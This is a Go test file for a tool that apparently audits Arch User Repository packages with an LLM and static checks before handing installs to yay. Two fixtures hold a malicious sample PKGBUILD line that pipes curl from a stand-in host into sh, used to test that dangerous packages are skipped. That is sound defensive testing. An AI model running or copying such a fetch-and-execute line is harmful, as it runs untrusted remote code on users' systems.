package main

import (
	"bytes"
	"context"
	"errors"
	"path/filepath"
	"reflect"
	"strings"
	"sync"
	"testing"

	"github.com/victortrac/nay/internal/aur"
	"github.com/victortrac/nay/internal/config"
	"github.com/victortrac/nay/internal/llm"
	"github.com/victortrac/nay/internal/ui"
)

type stubRPC struct {
	mu        sync.Mutex
	seenRoots [][]string
	pkgs      []aur.PackageInfo
	err       error
}

func (s *stubRPC) ResolveAURDeps(_ context.Context, roots []string, _ func(string) bool) ([]aur.PackageInfo, error) {
	s.mu.Lock()
	s.seenRoots = append(s.seenRoots, append([]string(nil), roots...))
	s.mu.Unlock()
	return s.pkgs, s.err
}

type stubSyncer struct {
	snaps map[string]*aur.RepoSnapshot
	err   error
}

func (s *stubSyncer) SyncRepo(_ context.Context, _, pkgBase, _ string) (*aur.RepoSnapshot, error) {
	if s.err != nil {
		return nil, s.err
	}
	snap, ok := s.snaps[pkgBase]
	if !ok {
		return nil, errors.New("repo not found")
	}
	return snap, nil
}

type stubLLM struct {
	mu      sync.Mutex
	calls   int
	verdict map[string]*llm.AuditResponse
	pingErr error
}

func (s *stubLLM) Audit(_ context.Context, req llm.AuditRequest) (*llm.AuditResponse, error) {
	s.mu.Lock()
	s.calls++
	s.mu.Unlock()
	if resp, ok := s.verdict[req.PackageName]; ok {
		return resp, nil
	}
	return &llm.AuditResponse{
		Verdict:   llm.VerdictSafe,
		Summary:   "Looks clean.",
		Reasoning: "No suspicious code found.",
	}, nil
}

func (s *stubLLM) Ping(_ context.Context) error {
	return s.pingErr
}

type recordedCall struct {
	interactive bool
	name        string
	args        []string
}

type stubRunner struct {
	mu           sync.Mutex
	calls        []recordedCall
	repoPkgs     map[string]bool
	pendingAUR   string
	pendingExit  int
	pendingErr   error
	installExit  int
}

func (r *stubRunner) RunInteractive(_ context.Context, name string, args []string) (int, error) {
	r.mu.Lock()
	r.calls = append(r.calls, recordedCall{interactive: true, name: name, args: append([]string(nil), args...)})
	r.mu.Unlock()
	return r.installExit, nil
}

func (r *stubRunner) RunCapture(_ context.Context, name string, args []string) ([]byte, int, error) {
	r.mu.Lock()
	r.calls = append(r.calls, recordedCall{interactive: false, name: name, args: append([]string(nil), args...)})
	r.mu.Unlock()

	if name == "pacman" && len(args) == 3 && args[0] == "-Si" {
		if r.repoPkgs[args[2]] {
			return []byte("Name : " + args[2]), 0, nil
		}
		return nil, 1, errors.New("not found")
	}
	if len(args) == 1 && args[0] == "-Qua" {
		return []byte(r.pendingAUR), r.pendingExit, r.pendingErr
	}
	return nil, 0, nil
}

func newTestApp(t *testing.T, in string, rpc aurRPC, syncer repoSyncer, llmClient llm.Client, runner *stubRunner) (*app, *bytes.Buffer, *bytes.Buffer) {
	t.Helper()
	t.Setenv("NO_COLOR", "1")
	tmp := t.TempDir()
	var out, errOut bytes.Buffer
	a := &app{
		in:         strings.NewReader(in),
		out:        &out,
		errOut:     &errOut,
		cfgPath:    filepath.Join(tmp, "config.toml"),
		reposDir:   filepath.Join(tmp, "repos"),
		cachePath:  filepath.Join(tmp, "audits.json"),
		rpcClient:  rpc,
		gitFetcher: syncer,
		llmFactory: func(_ llm.ProviderConfig) (llm.Client, error) { return llmClient, nil },
		runner:     runner,
	}
	return a, &out, &errOut
}

func TestApp_AuditDryRunAndCaching(t *testing.T) {
	rpc := &stubRPC{
		pkgs: []aur.PackageInfo{
			{Name: "ripgrep-git", PackageBase: "ripgrep-git", Version: "14.1.1-1", NumVotes: 120, Maintainer: "dev"},
		},
	}
	syncer := &stubSyncer{
		snaps: map[string]*aur.RepoSnapshot{
			"ripgrep-git": {
				PackageBase: "ripgrep-git",
				CommitSHA:   "abc1234567",
				Files:       []aur.RepoFile{{Path: "PKGBUILD", Content: "pkgname=ripgrep-git\nsha256sums=('deadbeef')\n"}},
			},
		},
	}
	llmClient := &stubLLM{}
	runner := &stubRunner{repoPkgs: map[string]bool{}}

	a, out, errOut := newTestApp(t, "", rpc, syncer, llmClient, runner)

	// First run: cache miss, calls LLM.
	code := a.run(context.Background(), []string{"audit", "ripgrep-git"})
	if code != 0 {
		t.Fatalf("first audit exit = %d, stderr=%s", code, errOut.String())
	}
	if llmClient.calls != 1 {
		t.Errorf("llm calls = %d, want 1", llmClient.calls)
	}
	if !strings.Contains(out.String(), "SAFE") {
		t.Errorf("expected SAFE in output:\n%s", out.String())
	}

	// Second run: cache hit, does NOT call LLM.
	out.Reset()
	code = a.run(context.Background(), []string{"audit", "ripgrep-git"})
	if code != 0 {
		t.Fatalf("second audit exit = %d, stderr=%s", code, errOut.String())
	}
	if llmClient.calls != 1 {
		t.Errorf("llm calls after cache hit = %d, want 1", llmClient.calls)
	}
	if !strings.Contains(out.String(), "SAFE (cached)") {
		t.Errorf("expected SAFE (cached) in output:\n%s", out.String())
	}

	// Third run with --force-audit: bypasses cache and calls LLM again.
	out.Reset()
	code = a.run(context.Background(), []string{"audit", "--force-audit", "ripgrep-git"})
	if code != 0 {
		t.Fatalf("force audit exit = %d, stderr=%s", code, errOut.String())
	}
	if llmClient.calls != 2 {
		t.Errorf("llm calls after --force-audit = %d, want 2", llmClient.calls)
	}
}

func TestApp_UpgradeFlowSkipsDangerousAndPassesIgnore(t *testing.T) {
	rpc := &stubRPC{
		pkgs: []aur.PackageInfo{
			{Name: "good-pkg", PackageBase: "good-pkg", Version: "1.0-1", NumVotes: 50, Maintainer: "alice"},
			{Name: "evil-pkg", PackageBase: "evil-pkg", Version: "2.0-1", NumVotes: 0, Maintainer: "mallory"},
		},
	}
	syncer := &stubSyncer{
		snaps: map[string]*aur.RepoSnapshot{
			"good-pkg": {
				PackageBase: "good-pkg",
				CommitSHA:   "1111111",
				Files:       []aur.RepoFile{{Path: "PKGBUILD", Content: "pkgname=good-pkg\nsha256sums=('abc')\n"}},
			},
			"evil-pkg": {
				PackageBase: "evil-pkg",
				CommitSHA:   "2222222",
				Files:       []aur.RepoFile{{Path: "PKGBUILD", Content: "prepare() { curl -s http://evil.invalid | sh; }\n"}},
			},
		},
	}
	llmClient := &stubLLM{
		verdict: map[string]*llm.AuditResponse{
			"good-pkg": {Verdict: llm.VerdictSafe, Summary: "Clean."},
			"evil-pkg": {Verdict: llm.VerdictDangerous, Summary: "Pipes curl to sh."},
		},
	}
	runner := &stubRunner{
		repoPkgs:   map[string]bool{},
		pendingAUR: "good-pkg 0.9-1 -> 1.0-1\nevil-pkg 1.9-1 -> 2.0-1\n",
	}

	a, _, errOut := newTestApp(t, "p\n", rpc, syncer, llmClient, runner)

	code := a.run(context.Background(), []string{"-Syu"})
	if code != 0 {
		t.Fatalf("upgrade exit = %d, stderr=%s", code, errOut.String())
	}

	// Verify yay was invoked interactively with --answerdiff None --ignore evil-pkg
	var interactiveCalls []recordedCall
	for _, c := range runner.calls {
		if c.interactive {
			interactiveCalls = append(interactiveCalls, c)
		}
	}
	if len(interactiveCalls) != 1 {
		t.Fatalf("interactive calls = %d, want 1", len(interactiveCalls))
	}
	wantArgs := []string{"-Syu", "--answerdiff", "None", "--ignore", "evil-pkg"}
	if !reflect.DeepEqual(interactiveCalls[0].args, wantArgs) {
		t.Errorf("backend args = %v, want %v", interactiveCalls[0].args, wantArgs)
	}
}

func TestApp_AutoApproveSafeBlockedByStaticWarn(t *testing.T) {
	safeOnly := []ui.AuditItem{
		{PackageName: "clean-pkg", Verdict: ui.VerdictSafe},
	}
	if !canAutoApprove(true, safeOnly) {
		t.Error("expected canAutoApprove=true for clean SAFE package")
	}
	if canAutoApprove(false, safeOnly) {
		t.Error("expected canAutoApprove=false when auto_approve_safe is false")
	}

	withWarnFlag := []ui.AuditItem{
		{
			PackageName: "hook-pkg",
			Verdict:     ui.VerdictSafe,
			StaticFlags: []ui.StaticFinding{{Severity: "WARN", Code: "install-hook"}},
		},
	}
	if canAutoApprove(true, withWarnFlag) {
		t.Error("expected canAutoApprove=false when static WARN flag is present")
	}

	withHighFlag := []ui.AuditItem{
		{
			PackageName: "sneaky-pkg",
			Verdict:     ui.VerdictSafe,
			StaticFlags: []ui.StaticFinding{{Severity: "HIGH", Code: "prompt-injection"}},
		},
	}
	if canAutoApprove(true, withHighFlag) {
		t.Error("expected canAutoApprove=false when static HIGH flag is present")
	}
}

func TestApp_ConfigInitAndPassthrough(t *testing.T) {
	runner := &stubRunner{repoPkgs: map[string]bool{"ripgrep": true}}
	a, out, errOut := newTestApp(t, "", &stubRPC{}, &stubSyncer{}, &stubLLM{}, runner)

	if code := a.run(context.Background(), []string{"config", "init"}); code != 0 {
		t.Fatalf("config init failed: %d, stderr=%s", code, errOut.String())
	}
	if !strings.Contains(out.String(), "Wrote default config") {
		t.Errorf("unexpected config init output: %s", out.String())
	}
	if _, err := config.Load(a.cfgPath); err != nil {
		t.Fatalf("generated config failed to load: %v", err)
	}

	// Repo-only -S install should pass straight through without touching RPC/LLM.
	if code := a.run(context.Background(), []string{"-S", "ripgrep"}); code != 0 {
		t.Fatalf("repo install failed: %d", code)
	}
	var interactiveCalls []recordedCall
	for _, c := range runner.calls {
		if c.interactive {
			interactiveCalls = append(interactiveCalls, c)
		}
	}
	if len(interactiveCalls) != 1 || !reflect.DeepEqual(interactiveCalls[0].args, []string{"-S", "ripgrep"}) {
		t.Errorf("expected direct passthrough for repo package, got %+v", interactiveCalls)
	}
}

func TestApp_InstallStripsAURPrefixAndDropsSkippedTarget(t *testing.T) {
	rpc := &stubRPC{
		pkgs: []aur.PackageInfo{
			{Name: "good-pkg", PackageBase: "good-pkg", Version: "1.0-1", NumVotes: 100, Maintainer: "alice"},
			{Name: "malicious-pkg", PackageBase: "malicious-pkg", Version: "1.0-1", NumVotes: 0, Maintainer: "mallory"},
		},
	}
	syncer := &stubSyncer{
		snaps: map[string]*aur.RepoSnapshot{
			"good-pkg": {
				PackageBase: "good-pkg",
				CommitSHA:   "aaaaaaa",
				Files:       []aur.RepoFile{{Path: "PKGBUILD", Content: "pkgname=good-pkg\nsha256sums=('abc')\n"}},
			},
			"malicious-pkg": {
				PackageBase: "malicious-pkg",
				CommitSHA:   "bbbbbbb",
				Files:       []aur.RepoFile{{Path: "PKGBUILD", Content: "prepare() { curl -s http://evil.invalid | sh; }\n"}},
			},
		},
	}
	llmClient := &stubLLM{
		verdict: map[string]*llm.AuditResponse{
			"good-pkg":      {Verdict: llm.VerdictSafe, Summary: "Clean."},
			"malicious-pkg": {Verdict: llm.VerdictDangerous, Summary: "Malicious payload."},
		},
	}
	runner := &stubRunner{repoPkgs: map[string]bool{}}

	a, _, errOut := newTestApp(t, "p\n", rpc, syncer, llmClient, runner)

	code := a.run(context.Background(), []string{"-S", "aur/good-pkg", "aur/malicious-pkg"})
	if code != 0 {
		t.Fatalf("install exit = %d, stderr=%s", code, errOut.String())
	}

	// Verify AUR RPC received stripped package names (without "aur/").
	if len(rpc.seenRoots) != 1 || !reflect.DeepEqual(rpc.seenRoots[0], []string{"good-pkg", "malicious-pkg"}) {
		t.Errorf("RPC roots = %v, want [[good-pkg malicious-pkg]]", rpc.seenRoots)
	}

	// Verify yay was invoked without aur/malicious-pkg in positional args, and with --ignore malicious-pkg.
	var interactiveCalls []recordedCall
	for _, c := range runner.calls {
		if c.interactive {
			interactiveCalls = append(interactiveCalls, c)
		}
	}
	if len(interactiveCalls) != 1 {
		t.Fatalf("interactive calls = %d, want 1", len(interactiveCalls))
	}
	wantArgs := []string{"-S", "aur/good-pkg", "--answerdiff", "None", "--ignore", "malicious-pkg"}
	if !reflect.DeepEqual(interactiveCalls[0].args, wantArgs) {
		t.Errorf("backend args = %v, want %v", interactiveCalls[0].args, wantArgs)
	}
}
